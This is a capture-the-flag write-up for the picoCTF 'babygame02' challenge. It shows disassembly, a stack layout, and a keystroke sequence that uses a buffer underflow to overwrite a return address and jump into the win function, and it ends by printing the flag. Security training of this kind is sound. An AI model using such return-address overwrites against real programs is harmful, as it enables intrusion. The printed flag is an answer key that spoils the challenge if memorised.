# babygame02
## Description
Break the game and get the flag.
Welcome to BabyGame 02! Navigate around the map and see what you can find! The game is available to download here. There is no source available, so you'll have to figure your way around the map. You can connect with it using nc saturn.picoctf.net 64691.
## Hints
- Use 'w','a','s','d' to move around.
- There may be secret commands to make your life easy.
## Solution
- Opening in IDA and looking at main:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _DWORD v4[2]; // [esp+0h] [ebp-AA0h] BYREF
  _BYTE v5[2700]; // [esp+Bh] [ebp-A95h] BYREF
  char v6; // [esp+A97h] [ebp-9h]
  int *p_argc; // [esp+A98h] [ebp-8h]

  p_argc = &argc;
  init_player(v4);
  init_map((int)v5, v4);
  print_map((int)v5);
  signal(2, (__sighandler_t)sigint_handler);
  do
  {
    do
    {
      v6 = getchar();
      move_player(v4, v6, (int)v5);
      print_map((int)v5);
    }
    while ( v4[0] != 29 );
  }
  while ( v4[1] != 89 );
  puts("You win!");
  return 0;
}
```
- This time `win` is not being called. We perhaps need to overwrite the return address of the main function.
- Looking at the disassembly of main:
```
08049674 <main>:
 8049674: 8d 4c 24 04                   lea     ecx, [esp + 0x4]
 8049678: 83 e4 f0                      and     esp, -0x10
 804967b: ff 71 fc                      push    dword ptr [ecx - 0x4]
 804967e: 55                            push    ebp
 804967f: 89 e5                         mov     ebp, esp
 8049681: 53                            push    ebx
 8049682: 51                            push    ecx
 8049683: 81 ec a0 0a 00 00             sub     esp, 0xaa0
 8049689: e8 b2 fa ff ff                call    0x8049140 <__x86.get_pc_thunk.bx>
 804968e: 81 c3 72 29 00 00             add     ebx, 0x2972
 8049694: 8d 85 60 f5 ff ff             lea     eax, [ebp - 0xaa0]
 804969a: 50                            push    eax
 804969b: e8 b1 fd ff ff                call    0x8049451 <init_player>
 80496a0: 83 c4 04                      add     esp, 0x4
 80496a3: 8d 85 60 f5 ff ff             lea     eax, [ebp - 0xaa0]
 80496a9: 50                            push    eax
 80496aa: 8d 85 6b f5 ff ff             lea     eax, [ebp - 0xa95]
 80496b0: 50                            push    eax
 80496b1: e8 6d fb ff ff                call    0x8049223 <init_map>
 80496b6: 83 c4 08                      add     esp, 0x8
 80496b9: 83 ec 08                      sub     esp, 0x8
 80496bc: 8d 85 60 f5 ff ff             lea     eax, [ebp - 0xaa0]
 80496c2: 50                            push    eax
 80496c3: 8d 85 6b f5 ff ff             lea     eax, [ebp - 0xa95]
 80496c9: 50                            push    eax
 80496ca: e8 e0 fc ff ff                call    0x80493af <print_map>
 80496cf: 83 c4 10                      add     esp, 0x10
 80496d2: 83 ec 08                      sub     esp, 0x8
 80496d5: 8d 83 06 d2 ff ff             lea     eax, [ebx - 0x2dfa]
 80496db: 50                            push    eax
 80496dc: 6a 02                         push    0x2
 80496de: e8 ad f9 ff ff                call    0x8049090 <signal@plt>
 80496e3: 83 c4 10                      add     esp, 0x10
 80496e6: e8 85 f9 ff ff                call    0x8049070 <getchar@plt>
 80496eb: 88 45 f7                      mov     byte ptr [ebp - 0x9], al
 80496ee: 0f be 45 f7                   movsx   eax, byte ptr [ebp - 0x9]
 80496f2: 83 ec 04                      sub     esp, 0x4
 80496f5: 8d 95 6b f5 ff ff             lea     edx, [ebp - 0xa95]
 80496fb: 52                            push    edx
 80496fc: 50                            push    eax
 80496fd: 8d 85 60 f5 ff ff             lea     eax, [ebp - 0xaa0]
 8049703: 50                            push    eax
 8049704: e8 6b fd ff ff                call    0x8049474 <move_player>
 8049709: 83 c4 10                      add     esp, 0x10
 804970c: 83 ec 08                      sub     esp, 0x8
 804970f: 8d 85 60 f5 ff ff             lea     eax, [ebp - 0xaa0]
 8049715: 50                            push    eax
 8049716: 8d 85 6b f5 ff ff             lea     eax, [ebp - 0xa95]
 804971c: 50                            push    eax
 804971d: e8 8d fc ff ff                call    0x80493af <print_map>
 8049722: 83 c4 10                      add     esp, 0x10
 8049725: 8b 85 60 f5 ff ff             mov     eax, dword ptr [ebp - 0xaa0]
 804972b: 83 f8 1d                      cmp     eax, 0x1d
 804972e: 75 b6                         jne     0x80496e6 <main+0x72>
 8049730: 8b 85 64 f5 ff ff             mov     eax, dword ptr [ebp - 0xa9c]
 8049736: 83 f8 59                      cmp     eax, 0x59
 8049739: 75 ab                         jne     0x80496e6 <main+0x72>
 804973b: 83 ec 0c                      sub     esp, 0xc
 804973e: 8d 83 3f e0 ff ff             lea     eax, [ebx - 0x1fc1]
 8049744: 50                            push    eax
 8049745: e8 66 f9 ff ff                call    0x80490b0 <puts@plt>
 804974a: 83 c4 10                      add     esp, 0x10
 804974d: 90                            nop
 804974e: b8 00 00 00 00                mov     eax, 0x0
 8049753: 8d 65 f8                      lea     esp, [ebp - 0x8]
 8049756: 59                            pop     ecx
 8049757: 5b                            pop     ebx
 8049758: 5d                            pop     ebp
 8049759: 8d 61 fc                      lea     esp, [ecx - 0x4]
 804975c: c3                            ret
```
- Let's frame the picture of the stack when `move_player` is called:
```
ebp
ebx
ecx
...
2720 bytes (esp-0xaa0)
...
4 bytes (esp-0x4)
edx (edx - 0xa95 (2709 bytes)) (address of the beginning of the map)
eax
eax
return address before calling move_player (0x8049404)
```
- since we can buffer underflow, we can overwrite the return address of `move_player` with the address of `win` function.
- we need to move (2720-2709) + 4*7 = 39 bytes to reach the first byte of the return address (LSB).
- Here is disassembly of `win`:
```
0804975d <win>:
 804975d: 55                            push    ebp
 804975e: 89 e5                         mov     ebp, esp
 8049760: 53                            push    ebx
 8049761: 83 ec 44                      sub     esp, 0x44
 8049764: e8 d7 f9 ff ff                call    0x8049140 <__x86.get_pc_thunk.bx>
 8049769: 81 c3 97 28 00 00             add     ebx, 0x2897
 804976f: 90                            nop
 8049770: 90                            nop
 8049771: 90                            nop
 8049772: 90                            nop
 8049773: 90                            nop
 8049774: 90                            nop
 8049775: 90                            nop
 8049776: 90                            nop
 8049777: 90                            nop
 8049778: 90                            nop
 8049779: 83 ec 08                      sub     esp, 0x8
 804977c: 8d 83 48 e0 ff ff             lea     eax, [ebx - 0x1fb8]
 8049782: 50                            push    eax
 8049783: 8d 83 4a e0 ff ff             lea     eax, [ebx - 0x1fb6]
 8049789: 50                            push    eax
 804978a: e8 41 f9 ff ff                call    0x80490d0 <fopen@plt>
 804978f: 83 c4 10                      add     esp, 0x10
 8049792: 89 45 f4                      mov     dword ptr [ebp - 0xc], eax
 8049795: 83 7d f4 00                   cmp     dword ptr [ebp - 0xc], 0x0
 8049799: 75 1c                         jne     0x80497b7 <win+0x5a>
 804979b: 83 ec 0c                      sub     esp, 0xc
 804979e: 8d 83 54 e0 ff ff             lea     eax, [ebx - 0x1fac]
 80497a4: 50                            push    eax
 80497a5: e8 06 f9 ff ff                call    0x80490b0 <puts@plt>
 80497aa: 83 c4 10                      add     esp, 0x10
 80497ad: 83 ec 0c                      sub     esp, 0xc
 80497b0: 6a 00                         push    0x0
 80497b2: e8 09 f9 ff ff                call    0x80490c0 <exit@plt>
 80497b7: 83 ec 04                      sub     esp, 0x4
 80497ba: ff 75 f4                      push    dword ptr [ebp - 0xc]
 80497bd: 6a 3c                         push    0x3c
 80497bf: 8d 45 b8                      lea     eax, [ebp - 0x48]
 80497c2: 50                            push    eax
 80497c3: e8 b8 f8 ff ff                call    0x8049080 <fgets@plt>
 80497c8: 83 c4 10                      add     esp, 0x10
 80497cb: 83 ec 0c                      sub     esp, 0xc
 80497ce: 8d 45 b8                      lea     eax, [ebp - 0x48]
 80497d1: 50                            push    eax
 80497d2: e8 79 f8 ff ff                call    0x8049050 <printf@plt>
 80497d7: 83 c4 10                      add     esp, 0x10
 80497da: 90                            nop
 80497db: 8b 5d fc                      mov     ebx, dword ptr [ebp - 0x4]
 80497de: c9                            leave
 80497df: c3                            ret
```
- The first 3 bytes are the same, we just need to clobber the last byte. There are a bunch of `nop` sleds. If we can clobber the return address to them, we'll get our flag.
- We'll use the `lq` command to change our player character to `q` (ASCII 0x71) and if we clobber successfully, we'll get the flag.
- But we can't directly go `a` 39 times from the start of the buffer as it corrupts memory and program crashes.
- We can do a `w` (which moves us back one entire row, which is 90 bytes), then do `a` 39 times and then do a `s` to successfully clobber the return address and get the flag.
- The flag is `picoCTF{gamer_jump1ng_4r0unD_18d53688}`.